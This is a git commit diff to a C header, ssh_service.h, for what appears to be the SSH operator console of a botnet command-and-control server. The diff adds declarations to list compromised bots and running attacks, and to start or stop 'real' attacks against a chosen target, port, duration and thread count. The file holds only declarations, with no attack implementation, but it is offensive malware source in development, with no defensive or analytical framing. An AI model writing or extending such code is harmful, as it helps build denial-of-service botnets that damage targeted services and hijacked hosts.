c05e488e49faf36ad4036f765d88294ffc9e3de7
G406G <pedrosorianoortiz29@gmail.com>
2025-09-27 17:07:02 -0400

    Update ssh_service.h

--- ssh_service.h
+++ ssh_service.h
@@ -2,6 +2,13 @@
 #define SSH_SERVICE_H
 
 #include <pthread.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+// Forward declarations from main C&C
+typedef struct bot_s bot_t;
+typedef struct attack_s attack_t;
 
 #define SSH_PORT 2222
 #define MAX_CLIENTS 10
@@ -31,12 +38,21 @@ void save_users_to_file(void);
 void ssh_send_banner(int client_socket);
 void ssh_command_loop(client_session_t* session);
 
-// SSH Commands
+// SSH Commands with real data
 void ssh_help(client_session_t* session);
 void ssh_list_bots(client_session_t* session);
 void ssh_list_attacks(client_session_t* session);
 void ssh_start_attack(client_session_t* session, const char* command);
 void ssh_stop_attack(client_session_t* session, const char* command);
 void ssh_system_info(client_session_t* session);
+
+// Real data access functions
+extern bot_t* get_bots_list(void);
+extern int get_bot_count(void);
+extern attack_t* get_attacks_list(void);
+extern int get_attack_count(void);
+extern void start_real_attack(const char* method, const char* target, int port, int duration, int threads);
+extern void stop_real_attack(int attack_id);
+extern void stop_all_real_attacks(void);
 
 #endif
